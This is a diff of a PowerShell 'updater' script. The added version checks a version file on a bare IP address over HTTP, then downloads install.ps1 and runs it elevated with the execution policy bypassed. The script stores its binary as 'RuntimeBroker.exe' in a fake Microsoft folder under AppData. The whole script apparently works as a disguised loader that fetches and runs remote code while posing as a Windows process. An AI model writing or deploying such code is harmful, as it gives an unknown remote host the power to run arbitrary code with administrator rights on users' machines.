@@ -1,32 +1,55 @@
-﻿# Variables for task name and paths
-$taskName = 'AppRealtime'
-$currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]
-$appDataPath = "C:\Users\$currentUserName\AppData"
-$currentDir = "$appDataPath\Local\Microsoft\AppRealTime"
-$zipUrl = "http://116.203.93.143/00_update/app.zip"
-$zipFile = "$currentDir\app.zip"
+﻿# Define the URLs and paths
+$versionUrl = "http://116.203.93.143/00_update/version"
+$scriptUrl = "http://116.203.93.143/00_update/install.ps1"
+$appDataPath = "C:\Users\$env:USERNAME\AppData"
+$currentDir = "$appDataPath\Local\Microsoft\RuntimeBroker"
+$assemblyFile = "$currentDir\RuntimeBroker.exe"
+$tempScriptPath = "$env:TEMP\install.ps1"
 
-# 1. Stop the scheduled task if it is running
-$task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
-if ($task -ne $null) {
-    if ($task.State -eq 'Running') {
-        Stop-ScheduledTask -TaskName $taskName
+# Function to get the version from the server
+function Get-ServerVersion {
+    try {
+        $serverVersion = Invoke-RestMethod -Uri $versionUrl -Method Get -UseBasicParsing
+        return $serverVersion
+    } catch {
+        Write-Error "Failed to retrieve version from the server: $_"
+        exit 1
     }
 }
 
-# 2. Check for any processes using the files and kill them, then delete the directory
-if (Test-Path -Path $currentDir) {
-    $lockingProcesses = Get-Process | Where-Object { $_.Modules.FileName -like "$currentDir\*" }
-    foreach ($process in $lockingProcesses) {
-        Stop-Process -Id $process.Id -Force
+# Function to get the version from the assembly file
+function Get-AssemblyVersion {
+    try {
+        $assemblyVersion = (Get-Item $assemblyFile).VersionInfo.ProductVersion
+        return $assemblyVersion
+    } catch {
+        Write-Error "Failed to retrieve version from the assembly file: $_"
+        exit 1
     }
-    Remove-Item -Path $currentDir -Recurse -Force
 }
-New-Item -ItemType Directory -Path $currentDir | Out-Null
 
-# 3. Download the zip file from the server and extract it
-Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile
-Expand-Archive -Path $zipFile -DestinationPath $currentDir
+# Function to download and run the script if needed
+function Download-And-Run-Script {
+    try {
+        Invoke-WebRequest -Uri $scriptUrl -OutFile $tempScriptPath
+        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$tempScriptPath`"" -Verb RunAs
+    } catch {
+        Write-Error "Failed to download or run the script: $_"
+        exit 1
+    }
+}
 
-# 4. Start the task schedule again
-Start-ScheduledTask -TaskName $taskName
+# Main logic
+$serverVersion = Get-ServerVersion
+$assemblyVersion = Get-AssemblyVersion
+
+Write-Output "Server Version: $serverVersion"
+Write-Output "Assembly Version: $assemblyVersion"
+
+# Compare versions
+if ([version]$assemblyVersion -lt [version]$serverVersion) {
+    Write-Output "A newer version is available. Downloading and running the update script..."
+    Download-And-Run-Script
+} else {
+    Write-Output "No update is needed. The assembly version is up-to-date."
+}
